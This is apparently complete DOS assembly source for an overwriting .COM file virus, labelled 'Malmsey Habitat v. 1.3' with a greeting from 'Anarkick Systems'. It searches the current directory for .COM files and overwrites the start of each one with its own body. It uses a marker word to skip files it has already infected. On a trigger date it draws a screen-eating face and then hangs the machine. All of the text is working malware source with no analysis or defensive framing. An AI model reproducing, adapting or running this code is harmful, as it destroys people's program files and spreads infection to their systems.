    .intel_syntax noprefix
    .code16
    .text
    .org 0x100

start:
id_bytes:
    mov si,si
main:
    mov ah,0x4E
    mov cx,0x27
    mov dx,offset com_spec
file_loop:
    int 0x21
    jc exit_virus
    call infect_file
    jne exit_virus
    mov ah,0x4F
    jmp file_loop
exit_virus:
    mov ah,0x2A
    int 0x21
    cmp dl,3
    jne dos_drop
    cmp dh,10
    je eat_screen
dos_drop:
    int 0x20
eat_screen:
    mov byte ptr [count],0
    mov ah,0
    mov al,3
    int 0x10
    mov ah,8
    int 0x10
    mov byte ptr [count2],al
    cmp byte ptr [count2],0
    jne draw_face
    mov byte ptr [count2],0x0F
draw_face:
    mov ah,1
    mov cl,0
    mov ch,0x40
    int 0x10
    mov cl,0
    mov dl,0x4F
    mov ah,6
    mov al,0
    mov bh,0x0F
    mov ch,0
    mov cl,0
    mov dh,0
    mov dl,0x4F
    int 0x10
    mov ah,2
    mov dh,0
    mov dl,0x1F
    mov bh,0
    int 0x10
    mov dx,offset eyes
    mov ah,9
    mov bl,0x0F
    int 0x21
    mov ah,2
    mov dh,1
    mov dl,0
    int 0x10
    mov ah,9
    mov al,0xDC
    mov bl,0x0F
    mov cx,0x50
    int 0x10
    mov ah,2
    mov dh,0x18
    mov dl,0
    int 0x10
    mov ah,9
    mov al,0xDF
    mov bl,0x0F
    mov cx,0x50
    int 0x10
    mov dl,0
make_teeth:
    mov ah,2
    mov dh,2
    int 0x10
    mov ah,9
    mov al,0x55
    mov bl,0x0F
    mov cx,1
    int 0x10
    mov ah,2
    mov dh,0x17
    inc dl
    int 0x10
    mov ah,9
    mov al,0xEF
    mov bl,0x0F
    int 0x10
    inc dl
    cmp dl,0x50
    jl make_teeth
    mov byte ptr [count],0
pause_1:
    mov cx,0x7FFF
a_loop:
    loop a_loop
    inc byte ptr [count]
    cmp byte ptr [count],0x0A
    jl pause_1
    mov byte ptr [count],0
    mov cl,0
    mov dl,0x4F
close_jaws:
    mov ah,6
    mov al,1
    mov bh,byte ptr [count]
    mov ch,0x0D
    mov dh,0x18
    int 0x10
    mov ah,7
    mov al,1
    mov bh,byte ptr [count]
    mov ch,0
    mov dh,0x0C
    int 0x10
    mov cx,0x3FFF
b_loop:
    loop b_loop
    inc byte ptr [count]
    cmp byte ptr [count],0x0B
    jl close_jaws
    mov byte ptr [count],0
pause_2:
    mov cx,0x7FFF
finish_up:
    loop finish_up
    inc byte ptr [count]
    cmp byte ptr [count],0x0A
    jl pause_2
    mov ah,6
    mov al,0
    mov bh,byte ptr [count]
    mov ch,0
    mov cl,0
    mov dh,0x18
    mov dl,0x4F
    int 0x10
    mov ah,1
    mov cl,7
    mov ch,6
    int 0x10
    mov si,offset rabid
fuckin_loop:
    lodsb
    or al,al
fuckin_hang:
    jz fuckin_hang
    mov ah,0x0E
    int 0x10
    jmp fuckin_loop
infect_file:
    mov ax,0x3D02
    mov dx,0x9E
    int 0x21
    xchg bx,ax
    mov ah,0x3F
    mov cx,2
    mov dx,offset buffer
    int 0x21
    cmp word ptr [buffer],0xF68B
    pushf
    je close_it_up
    cwd
    mov cx,dx
    mov ax,0x4200
    int 0x21
    mov ah,0x40
    mov cx,(finish-start)
    mov dx,offset start
    int 0x21
close_it_up:
    mov ah,0x3E
    int 0x21
    popf
    ret
buffer:
    .word 0
com_spec:
    .asciz "*.COM"
count:
    .byte 0
    .byte 0
count2:
    .byte 0
    .byte 0
eyes:
    .asciz "(o)          (o)$"
dinked:
    .asciz "[Malmsey Habitat v. 1.3]"
rabid:
    .byte 0x0D,0x0A
    .ascii "Warmest Regards to  RABID"
    .byte 0x0D,0x0A
    .asciz "from -- ANARKICK SYSTEMS!  "
    .byte 0x24
finish:
